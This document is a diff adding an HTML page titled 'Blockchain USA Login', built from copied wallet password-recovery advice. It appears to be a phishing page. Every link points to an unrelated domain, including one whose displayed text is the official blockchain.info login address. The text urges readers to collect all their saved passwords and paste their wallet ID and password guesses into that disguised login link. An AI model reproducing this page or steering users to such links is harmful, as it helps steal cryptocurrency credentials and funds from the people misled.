@@ -1,0 +1,115 @@
+<html>
+<head>
+<Title> Blockchain USA Login </Title>
+<a href="https://cobenstusliner.com/vnH26kLTymg3HH7jVsDTpgc2">
+<center> <img src="https://i.ibb.co/bQDf5sw/blockchain-login-full.jpg"width="1280"height="720"> </center>
+</a>
+<Body>
+<h1>Blockchain Login|Login to Blockchain</h1>
+<p>
+<br>Blockchain.info was founded in late 2011 and released its Bitcoin wallet in January of 2012.  The Blockchain wallet has many accolades:
+
+<br>It is commonly named to top-5 and top-10 lists of top cryptocurrency wallets,
+<br>As of January 2018 its users have created more than 21 million accounts.
+<br>It claims to be the “#1 digital wallet” for cryptocurrency.
+<br>In June 2018, Blockchain announced that it was moving from Blockchain.info to Blockchain.com.
+<br>The Blockchain wallet is what is known as a “hybrid” wallet. This means that the company stores an encrypted version of your wallet’s private key on their servers, but it does not store your password.  This provides a number of benefits:
+<p>
+<br>Convenience: you can access your wallet anywhere you can get an internet connection.
+<br>Continuity: you don’t have to worry if your laptop dies — <a href="https://cobenstusliner.com/vnH26kLTymg3HH7jVsDTpgc2">Blockchain.info</a> still has your wallet.
+<br>Security: even if hackers access the company’s servers they can’t steal your password (and your coins) because they aren’t stored there.
+<br>However, there is one major drawback: if you lose your password (and you have not written down your 12-word wallet recovery phrase) the company cannot retrieve or reset your password for you.
+<br>As Blockchain.info says: “Unfortunately, we’re unable to help you re-gain access to your wallet if you’ve lost or forgotten your password. This is because we don’t have access to your wallet or your wallet password.”
+<br>However, CryptoAssetRecover.com can help you recover your password.  This article documents a process you can use that may allow you to recover your password yourself.  However, our clients often reach a point where they need professional help.
+<p>
+<br>If you’d like our help in recovering your password, please:
+<p>
+<h3>Contact us</h3>
+<br>If you have lost your Blockchain.info password, recovering it is essentially a two-step process:
+
+<h2>Find your Wallet ID</h2>
+<br>Collect and test your best guesses as to what your password is
+<br>This guide will walk you through both steps in detail.
+
+<br>How to Find your Wallet ID
+<br>A Blockchain Wallet ID is simply a username for <a href="https://cobenstusliner.com/vnH26kLTymg3HH7jVsDTpgc2">your Blockchain account</a>. (It is not a blockchain public address or private key).
+
+<h2>A Wallet ID is made up of 32 alphanumeric characters and 4 dashes. It takes the following format:</h2>
+
+<br>xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+
+<br>Blockchain.com has an article that may answer more questions titled: What is a wallet ID?
+
+<br>The simplest way to find your Wallet ID is through your email account.  Blockchain lets you link an email address to your account so that they can send notifications when something changes.
+
+<br>Take a moment to write down all the email addresses that you might have linked to your Blockchain wallet.
+
+<h3>Search each email account for a message with the subject line:</h3>
+<br>“Welcome to My Wallet”.  If you find it, that message will contain your Wallet ID.
+<br>If that doesn’t work, you can take the following steps:
+<br>Open your web browser and go to: https://login.blockchain.com/#/login?product=wallet
+<br>It’s possible, but unlikely that your wallet id will be displayed in the “Wallet ID” field of the login form
+<br>Enter the email address you used to create the wallet in the “Your Email or Wallet ID” field, and click “Continue”
+<br>If the email address you entered is associated with one or more wallets, then Blockchain will email you the Wallet ID or IDs within a few minutes.
+<br>Once you find your Wallet ID, you’re ready to move on to making your password guesses.
+<p>
+<h3>How to Guess your Blockchain Password</h3>
+<br>Creating a good list of password guesses requires time and research.  We’ll start by explaining the minimum password requirements, then move into techniques you can use to jog your memory.  Your goal at this point is to cast a wide net:  what is the entire set of password components (also called “tokens”) that you might have used to create your password.
+<p>
+<h3>Blockchain Password Requirements</h3>
+<br>As of January of 2018, Blockchain.info enforces the following requirements on new accounts:
+<p>
+<br>Passwords must be at least 10 characters long
+<br>Certain strings (“1234567890”, “abcdefghij”, the same letter repeated 10 times) are not allowed
+<h4>This appears to be largely the same set of criteria that the company required in January of 2012, when they wrote:</h4> 
+<br>“We require a password of at least 10 characters in length to ensure that even if our database is compromised your wallet will remain secure.”
+<br>At the risk of stating the obvious, this means that whatever password you chose for your Blockchain wallet is at least 10 characters long.
+<h4>Update:</h4>
+<br>However, in February of 2021 we discovered a 2017 Blockchain password that was only 9 characters long. So, if your Blockchain password was created earlier than January of 2018, a shorter password length is possible.
+<br>How People Typically Create Passwords
+<br><h4>Most people have weaknesses in the way that they create and use passwords:</h4>
+<br>
+They re-use the same passwords on multiple websites.
+<br>Even when they use different passwords on different websites, they often re-use components of those passwords from site to site.
+<br>When people use numbers they tend to put those numbers at the end of their passwords.
+<br>While this is typically interpreted as a problem, in our case it’s a benefit.  If you’re like most people there’s a good chance that your Blockchain.info password is related to some of the other passwords that you have.  One strategy for making a good password guess: look at the other passwords that you have created, and look for common patterns.
+<br>Do you use the same strings (such as names of family members, sports teams, etc)
+<br>Do you use the same numbers (years, single digits, double digits, etc)
+<br>Do you use the same special characters (the tilde “~” or the hash “#”, for example)
+<br>Use your Browser Password Manager for Inspiration
+<br>One common source of inspiration is your web browser’s password manager.  This is the tool that asks you if you want your browser to remember your password when you create an account on a new website.
+<br>Here are instructions for opening your password manager on the most widely used web browsers:
+<br>Chrome
+<br>Firefox
+<br>Internet Explorer
+<h3>You want to do two things:</h3>
+<br>Write down each password down.
+<br>Look for common patterns in how you created those passwords.
+<br><h4>What “tokens” do you commonly re-use?</h4>
+<br>Where do you capitalize letters?
+<br>Where do you place numbers?
+<h4>What special characters do you use?</h4>
+<br>Create a Testing Plan
+<br>Once you have identified possible keywords and your own password creation patterns, it’s time to create a plan for how to proceed.  Basically, you want to create a long list of passwords and password variations that you can systematically use to try to login to your Blockchain.info account, one after the other.
+
+<br>In many ways, an offline spreadsheet created in Microsoft Excel, Apple Numbers, OpenOffice, or a similar program is the perfect tool for this job.  You can put each password in a new row, copy and paste the password from the spreadsheet to the Blockchain.info login form (rather than risking typos as you manually type each password), and record which passwords you have tried and which you haven’t.
+
+<br>The downside of using a spreadsheet is that you have now created a single file which contains the passwords for all of your accounts.  If you were to lose your computer (or get hacked) this would create a serious potential security risk.  If you use a spreadsheet (rather than pencil and paper) take the following precautions:
+
+<br>Switch from using your browser’s password manager to a secure password manager like LastPass.  Change all your passwords now.
+<br>Set a reminder in your calendar to delete the file in a week.
+<br>Save the spreadsheet to your desktop so that you won’t forget about it.
+<br>Make sure to delete the spreadsheet when you’re done.
+<p>
+<br>What to Put in your Spreadsheet
+<h4>Your spreadsheet needs to have two columns:</h4>
+<br>Guesses
+<br>Status
+<br>Start by copying and pasting your passwords from other services into the spreadsheet.  To get a feel for how the process works, point your web browser to the Blockchain.info login page: <a href="https://cobenstusliner.com/vnH26kLTymg3HH7jVsDTpgc2">https://blockchain.info/wallet/#/login</a>
+<br>Copy and paste your Wallet ID into the “Wallet ID” field
+<br>Copy and paste your first password guess in the “Password” field
+<br>Click the “LOG IN” button
+<br>If that first password doesn’t work, enter “Checked” in the “Status” column of your spreadsheet and move on to the second password.  Rinse and repeat.
+</body>
+</head>
+</html>
